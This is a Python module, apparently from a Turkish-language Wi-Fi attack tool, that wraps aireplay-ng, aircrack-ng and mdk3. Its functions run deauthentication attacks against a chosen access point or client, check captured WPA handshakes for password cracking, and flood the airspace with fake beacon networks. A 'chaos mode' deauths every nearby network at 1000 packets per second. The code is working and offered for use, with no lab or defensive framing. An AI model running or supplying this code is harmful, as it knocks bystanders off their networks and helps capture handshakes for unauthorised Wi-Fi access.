import subprocess
import os
import random
import string
import time
from modules import radar
from modules import engine

def pulse_kick(iface, bssid, client=None, timer=0):
    print(f"\n    [*] Vuruş başlatılıyor... (Süre: {'Sınırsız' if timer==0 else str(timer)+' sn'})")
    cmd = f"sudo aireplay-ng -0 0 -a {bssid}"
    if client: cmd += f" -c {client}"
    cmd += f" {iface}"
    
    try:
        if timer > 0:
            subprocess.run(cmd, shell=True, timeout=timer)
            print("\n    [✔] Süre doldu. Vuruş durduruldu.")
        else:
            subprocess.run(cmd, shell=True)
    except subprocess.TimeoutExpired:
        print("\n    [✔] Süre doldu. Vuruş durduruldu.")
    except KeyboardInterrupt:
        print("\n    [!] Vuruş manuel iptal edildi.")

def verify_handshake(cap_file):
    print(f"\n    [*] {cap_file} analizi yapılıyor...")
    cmd = f"sudo aircrack-ng {cap_file}"
    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    
    if "1 handshake" in res.stdout or "WPA (1 handshake" in res.stdout:
        print("    [✔] MÜKEMMEL! Geçerli bir Handshake yakalandı.")
        return True
    else:
        print("    [✘] Handshake bulunamadı! (İpucu: Ağda bağlı kimse olmayabilir veya cihaza daha çok yaklaşman gerekebilir. Süreyi uzatarak tekrar dene.)")
        return False

def beacon_spam(iface):
    print("\n    \033[96m[*] BEACON SPAM (Sahte Ağ Yayma) MODU\033[0m")
    print("    \033[93m[1]\033[0m Varsayılan Troll Listesi (Eğlenceli İsimler)")
    print("    \033[93m[2]\033[0m Rastgele İsimler Üret (Kaos Modu)")
    print("    \033[93m[3]\033[0m Kendi .txt Dosyanı Kullan")
    
    secim = input("\n    Seçiminiz: ")
    
    spam_file = "/tmp/pulse_spam.txt"
    
    if secim == "3":
        dosya_yolu = input("    .txt dosyasının tam yolunu girin (Örn: /home/enes/isimler.txt): ")
        if not os.path.exists(dosya_yolu):
            print("    [!] Dosya bulunamadı! İşlem iptal ediliyor.")
            return
        spam_file = dosya_yolu
        print(f"    [*] {dosya_yolu} içindeki isimler kullanılıyor...")
        
    else:
        if secim == "2":
            print("    [*] Rastgele 100 adet ağ ismi üretiliyor...")
            ssids = []
            for _ in range(100):
                uzunluk = random.randint(6, 12)
                isim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=uzunluk))
                ssids.append(f"WIFI_{isim}")
                
        else:
            print("    [*] Troll listesi yükleniyor...")
            ssids = [
                "[Hacked by PulseWifi]", 
                "FBI Surveillance Van", 
                "Bedava İnternet (VIRUSLU)", 
                "Senin Wi-Fi Artik Benim", 
                "Baglan da Hacklen", 
                "Kacinci Katta Oturuyorsun",
                "TurkTelekom_5G_Test",
                "Superonline_GUEST"
            ]
        
        with open(spam_file, "w") as f:
            for isim in ssids:
                f.write(isim + "\n")
    
    print("\n    [*] Sahte ağ sinyalleri havaya basılıyor... (Durdurmak için CTRL+C)")
    try:
        cmd = f"sudo mdk3 {iface} b -f {spam_file} -a -s 1000"
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n    [✔] Spam durduruldu. Hava sahası temizlendi.")
    except Exception as e:
        print("\n    [✘] Hata: 'mdk3' aracı eksik olabilir. (Terminalde: sudo apt install mdk3 yazarak kur)")

# ==========================================
# YENİ: CHAOS MODU (MDK3 AMOK - KANSER ETME)
# ==========================================
def chaos_mode(iface):
    print("\n    \033[91m\033[1m[!] KANSER MODU (MDK3 AMOK) AKTİF EDİLDİ [!]\033[0m")
    print("    \033[91m[*] MDK3 kanallar arasında ışık hızında zıplıyor...\033[0m")
    print("    \033[91m[*] Çevredeki tüm ağlarda devasa pingler ve kopmalar yaratılıyor.\033[0m")
    print("    \033[91m[*] (Durdurmak için CTRL+C)\033[0m")
    time.sleep(2)
    
    # mdk3 d : Deauth/Disassociation Amok Mode (Her şeye saldırır)
    # -s 1000 : Saniyede 1000 paketlik devasa bir mermi hızı
    cmd = f"sudo mdk3 {iface} d -s 1000"
    
    try:
        # MDK3 tüm kanal gezme ve vurma işini kendisi halleder
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n    \033[92m[✔] Kanser Modu durduruldu. Ortalık sakinleşti.\033[0m")